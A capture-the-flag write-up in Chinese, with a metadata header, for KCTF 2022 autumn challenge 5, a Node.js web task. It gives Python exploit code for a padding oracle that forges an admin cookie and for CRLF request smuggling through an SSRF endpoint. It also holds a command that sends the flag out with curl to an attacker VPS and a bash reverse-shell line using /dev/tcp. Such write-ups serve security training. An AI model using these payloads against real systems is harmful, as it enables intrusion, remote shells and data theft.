---
title: 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析
contest: 看雪2022 KCTF秋季赛
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Node.js 8, Padding Oracle, http.get CRLF拆分, HTTP走私, /C00mmmmanD命令执行, kctf.js]
attack_chain: 主页拿isadmin cookie→/admin检测非admin→padding oracle伪造admin=1→CRLF拆分GET/POST→HTTP走私到/C00mmmmanD→SSRF打命令cat kctf.js|grep flag|base64
key_payload: "padding_oracle.py;json_alphabet;CRLF=u010du010a;BLANK=u0120;content-length: 75;cmd=curl%20vps:port?`cat%20kctf.js%7Cgrep%20flag%7Cbase64`;Content-Length: 72;cmd=bash -c \"bash -i >%2526 /dev/tcp/ip/port 0>%25261\""
one_liner: KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到/C00mmmmanD执行命令
lesson: Node 8低版本http.get存在CRLF拆分；CBC+PKCS7+padding oracle可伪造任意明文；HTTP走私打SSRF
quality: high
---

# 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析

**赛事**：看雪2022 KCTF秋季赛 Q5《灾荒蔓延》

**难度**：围观1k+，2队攻破（98k + 摸鱼划水打酱油）

**题目设计**：
- Node.js项目（黑盒，无源码）
- /admin解密cookie判admin
- Padding Oracle Attack伪造admin cookie
- Node 8低版本 http.get 存在CRLF拆分漏洞
- HTTP走私到 /C00mmmmanD 命令执行

**完整利用链**：

**Step 1：Padding Oracle 攻击**：
```python
from padding_oracle import PaddingOracle
from optimized_alphabets import json_alphabet

def oracle(cipher_hex):
    r = requests.get("http://"+attackIP+":"+attackPort+"/admin",
                      headers={'Cookie': "isadmin={}".format(cipher_hex)})
    return b"Decrypt error" not in r.content

def step2(cipher):
    o = PaddingOracle(oracle, max_retries=-1)
    plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())
    plain_new = b'{"admin":"1"}'
    cipher_new = o.craft(cipher, plain, plain_new)
    return cipher_new
```
- cookie最后一位修改 → decrypt error
- 第一位修改 → json parse error
- 判定：**CBC模式 + PKCS7 Padding**

**Step 2：CRLF HTTP 走私**：
```python
def payload_encode(raw):
    payload = raw.replace('\n', '\u010d\u010a')  # CRLF unicode
                 .replace('+', '\u012b')
                 .replace(' ', '\u0120')
                 .replace('"', '\u0122')
                 .replace("'", '\u0a27')
                 .replace('[', '\u015b')
                 .replace(']', '\u015d')
                 .replace('`', '\u0127')
    return payload

def step3(new_cookie):
    payload = f" HTTP/1.1\n\nPOST /C00mmmmanD HTTP/1.1\nHost: 127.0.0.1\n"
              f"Cookie: isadmin={new_cookie}\n"
              f"Content-Type: application/x-www-form-urlencoded\n"
              f"Content-Length: 75\n\n"
              f"cmd=curl%20{vpsIP}%3A{vpsPort}%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60\n\n"
              f"GET / HTTP/1.1\ntest:"
    payload = payload_encode(payload)
    r = requests.get(f"http://{attackIP}:{attackPort}/search?url=http://127.0.0.1:{attackPort}/" + urllib.parse.quote(payload))
```

**Step 3：反弹shell变体**：
```
cmd=bash -c "bash -i >%2526 /dev/tcp/ip/port 0>%25261"
```

**关键技术**：
- **Padding Oracle Attack**：CBC + PKCS7
- **Node 8 CRLF拆分**：\n→\u010d\u010a unicode折叠
- **HTTP走私**：双GET/POST堆叠触发SSRF到内网endpoint
- **Unicode替换**：解决字符过滤（space, quote, bracket等）

**payload构造要点**：
- /search?url= SSRF入口
- CRLF unicode编码绕过http.get拆分限制
- Content-Length需准确
- 反弹shell需URL编码 `&` 为 `%2526`

**质量评估**：高（完整利用脚本 + Padding Oracle + CRLF + HTTP走私）
